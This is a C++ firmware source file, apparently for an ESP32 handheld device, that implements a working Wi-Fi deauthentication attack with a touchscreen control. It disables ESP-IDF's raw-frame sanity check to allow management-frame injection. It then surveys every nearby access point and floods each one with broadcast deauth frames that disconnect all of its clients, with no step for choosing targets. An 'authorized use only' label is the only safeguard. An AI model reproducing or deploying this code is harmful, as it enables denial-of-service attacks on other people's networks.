#include "deauth_attack.h"
#include "offense_wifi.h"
#include "wifi_beacon_manager.h"
#include "argus_mode.h"
#include "theme.h"
#include <lvgl.h>
#include <string.h>
#include <stdio.h>

// Defined in tools_screen.cpp
void tools_screen_show();

// Raw-frame sanity-check override: stock ESP-IDF rejects deauth/disassoc via
// esp_wifi_80211_tx (returns ESP_ERR_INVALID_ARG). This weak-symbol override
// disables the check so raw mgmt injection is allowed. VERIFY ON-HARDWARE: if the
// pinned core does not export this as weak, the link fails and this must be
// removed (deauth then cannot inject on this core).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

// ---- target list (filled during the survey phase) --------------------------
struct Target { uint8_t bssid[6]; uint8_t channel; };
#define DA_MAX_TARGETS 32
static Target   s_targets[DA_MAX_TARGETS];
static int      s_target_n = 0;
static uint32_t s_frames   = 0;
static int      s_inject_i = 0;

static bool         s_running    = false;
static bool         s_surveying  = false;
static lv_timer_t  *s_survey_end = nullptr;   // one-shot: end of survey phase
static lv_timer_t  *s_inject     = nullptr;   // periodic injector

static const uint32_t SURVEY_MS = 4000;

// Survey consumer: collect distinct BSSID + channel.
static void survey_cb(const WifiBeacon *b)
{
    if (!b || s_target_n >= DA_MAX_TARGETS) return;
    for (int i = 0; i < s_target_n; i++)
        if (memcmp(s_targets[i].bssid, b->bssid, 6) == 0) return;   // dedup
    memcpy(s_targets[s_target_n].bssid, b->bssid, 6);
    s_targets[s_target_n].channel = b->channel ? b->channel : 1;
    s_target_n++;
}

// Build a broadcast deauth frame (reason 7) from a target AP.
static int build_deauth(uint8_t *buf, const uint8_t *bssid)
{
    int i = 0;
    buf[i++] = 0xC0; buf[i++] = 0x00;                 // FC: deauth
    buf[i++] = 0x00; buf[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) buf[i++] = 0xFF;      // DA: broadcast (all clients)
    for (int k = 0; k < 6; k++) buf[i++] = bssid[k];  // SA: AP
    for (int k = 0; k < 6; k++) buf[i++] = bssid[k];  // BSSID: AP
    buf[i++] = 0x00; buf[i++] = 0x00;                 // seq
    buf[i++] = 0x07; buf[i++] = 0x00;                 // reason 7 (class-3 from non-assoc STA)
    return i;
}

static void inject_tick(lv_timer_t *)
{
    if (s_target_n == 0) return;
    Target &t = s_targets[s_inject_i];
    s_inject_i = (s_inject_i + 1) % s_target_n;
    offense_wifi_set_channel(t.channel);
    uint8_t frame[26];
    int len = build_deauth(frame, t.bssid);
    // a couple of frames per target per tick for effect
    for (int r = 0; r < 3; r++)
        if (offense_wifi_tx(frame, (size_t)len)) s_frames++;
}

static lv_timer_t *s_arm = nullptr;   // "arming" retry timer between survey + inject
static int         s_arm_tries = 0;

// After the survey ends, WiFi may still be held for ~1s by the detect_pipeline's
// PASSIVE beacon piggyback (it rides any scan and detaches on its next 1Hz tick
// now that our survey consumer is gone). offense_wifi_claim refuses while a beacon
// consumer is up, so retry the claim until WiFi is actually free, THEN inject.
static void arm_inject(lv_timer_t *t)
{
    if (offense_wifi_claim(1)) {
        lv_timer_del(t); s_arm = nullptr;
        s_surveying = false;
        s_inject_i  = 0;
        s_inject = lv_timer_create(inject_tick, 25, nullptr);
        return;
    }
    if (++s_arm_tries > 10) {          // ~5s and WiFi never freed - give up cleanly
        lv_timer_del(t); s_arm = nullptr;
        s_running = false; s_surveying = false;
    }
}

static void end_survey(lv_timer_t *t)
{
    lv_timer_del(t);
    s_survey_end = nullptr;
    wifi_beacon_remove(survey_cb);
    // Keep s_surveying true (UI shows "arming...") until the claim actually succeeds.
    s_arm_tries = 0;
    s_arm = lv_timer_create(arm_inject, 500, nullptr);   // repeats; arm_inject deletes it
}

bool deauth_attack_start()
{
    if (s_running) return true;
    s_target_n = 0; s_frames = 0; s_inject_i = 0;
    // Phase 1: survey. wifi_beacon_add brings WiFi up in hopping survey mode.
    if (!wifi_beacon_add(survey_cb)) return false;   // e.g. BLE up
    s_running   = true;
    s_surveying = true;
    s_survey_end = lv_timer_create(end_survey, SURVEY_MS, nullptr);
    lv_timer_set_repeat_count(s_survey_end, 1);
    return true;
}

void deauth_attack_stop()
{
    if (s_survey_end) { lv_timer_del(s_survey_end); s_survey_end = nullptr; }
    if (s_arm)        { lv_timer_del(s_arm);        s_arm = nullptr; }
    if (s_inject)     { lv_timer_del(s_inject);     s_inject = nullptr; }
    wifi_beacon_remove(survey_cb);   // no-op if already removed
    offense_wifi_release();
    s_running = false; s_surveying = false;
}

bool deauth_attack_is_running()  { return s_running; }
int  deauth_attack_target_count(){ return s_target_n; }
uint32_t deauth_attack_frames()  { return s_frames; }
bool deauth_attack_surveying()   { return s_surveying; }

// ---- screen ----------------------------------------------------------------

static lv_obj_t *da_screen;
static lv_obj_t *da_toggle_lbl;
static lv_obj_t *da_toggle_btn;
static lv_obj_t *da_status;
static lv_timer_t *da_ui;

static void da_refresh(lv_timer_t *)
{
    if (!deauth_attack_screen_is_active()) return;
    bool run = deauth_attack_is_running();
    lv_label_set_text(da_toggle_lbl, run ? "STOP" : "START");
    lv_obj_set_style_bg_color(da_toggle_btn, run ? HADES_RED : lv_color_make(0x00, 0xAA, 0x44), LV_PART_MAIN);
    if (!run) { lv_label_set_text(da_status, "idle"); return; }
    char b[64];
    if (deauth_attack_surveying())
        snprintf(b, sizeof(b), "%s %d APs", s_arm ? "arming..." : "surveying...",
                 deauth_attack_target_count());
    else
        snprintf(b, sizeof(b), "%d targets   %lu frames",
                 deauth_attack_target_count(), (unsigned long)deauth_attack_frames());
    lv_label_set_text(da_status, b);
}

static void da_on_toggle(lv_event_t *)
{
    if (deauth_attack_is_running()) deauth_attack_stop();
    else if (!deauth_attack_start()) { lv_label_set_text(da_status, "WiFi busy - turn BT off"); return; }
    da_refresh(nullptr);
}

static void da_on_gesture(lv_event_t *e)
{
    lv_indev_t *indev = lv_event_get_indev(e);
    if (lv_indev_get_gesture_dir(indev) == LV_DIR_RIGHT) {
        deauth_attack_stop();   // leaving the tool stops it (frees the radio)
        tools_screen_show();
    }
}

void deauth_attack_screen_create()
{
    da_screen = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(da_screen, lv_color_black(), LV_PART_MAIN);
    lv_obj_set_style_border_width(da_screen, 0, LV_PART_MAIN);

    lv_obj_t *title = lv_label_create(da_screen);
    lv_obj_set_style_text_color(title, ARGUS_OFFENSE_ACCENT, LV_PART_MAIN);
    lv_obj_set_style_text_font(title, &font_argus_label_28, LV_PART_MAIN);
    lv_label_set_text(title, "DEAUTH");
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 20);

    lv_obj_t *warn = lv_label_create(da_screen);
    lv_obj_set_style_text_color(warn, HADES_RED, LV_PART_MAIN);
    lv_obj_set_style_text_font(warn, &font_argus_label_16, LV_PART_MAIN);
    lv_obj_set_style_text_align(warn, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_set_width(warn, 380);
    lv_label_set_long_mode(warn, LV_LABEL_LONG_WRAP);
    lv_label_set_text(warn, "AUTHORIZED USE ONLY\nSurveys nearby APs, then disconnects\n"
                            "their clients. Actively disrupts other\npeople's networks - "
                            "authorized targets only.");
    lv_obj_align(warn, LV_ALIGN_TOP_MID, 0, 70);

    da_status = lv_label_create(da_screen);
    lv_obj_set_style_text_color(da_status, lv_color_make(0x3C, 0xDC, 0x78), LV_PART_MAIN);
    lv_obj_set_style_text_font(da_status, &font_argus_mono_16, LV_PART_MAIN);
    lv_label_set_text(da_status, "idle");
    lv_obj_align(da_status, LV_ALIGN_CENTER, 0, 20);

    da_toggle_btn = lv_button_create(da_screen);
    lv_obj_set_size(da_toggle_btn, 200, 70);
    lv_obj_align(da_toggle_btn, LV_ALIGN_BOTTOM_MID, 0, -30);
    lv_obj_set_style_radius(da_toggle_btn, 12, LV_PART_MAIN);
    lv_obj_set_style_bg_color(da_toggle_btn, lv_color_make(0x00, 0xAA, 0x44), LV_PART_MAIN);
    lv_obj_add_event_cb(da_toggle_btn, da_on_toggle, LV_EVENT_CLICKED, NULL);
    da_toggle_lbl = lv_label_create(da_toggle_btn);
    lv_obj_set_style_text_color(da_toggle_lbl, lv_color_white(), LV_PART_MAIN);
    lv_obj_set_style_text_font(da_toggle_lbl, &font_argus_label_28, LV_PART_MAIN);
    lv_label_set_text(da_toggle_lbl, "START");
    lv_obj_center(da_toggle_lbl);

    lv_obj_add_event_cb(da_screen, da_on_gesture, LV_EVENT_GESTURE, NULL);

    da_ui = lv_timer_create(da_refresh, 500, NULL);
    lv_timer_pause(da_ui);
}

void deauth_attack_screen_show()
{
    if (argus_mode_current() != ArgusMode::Offense) { tools_screen_show(); return; }
    da_refresh(nullptr);
    lv_timer_resume(da_ui);
    lv_scr_load(da_screen);
}

bool deauth_attack_screen_is_active() { return lv_screen_active() == da_screen; }
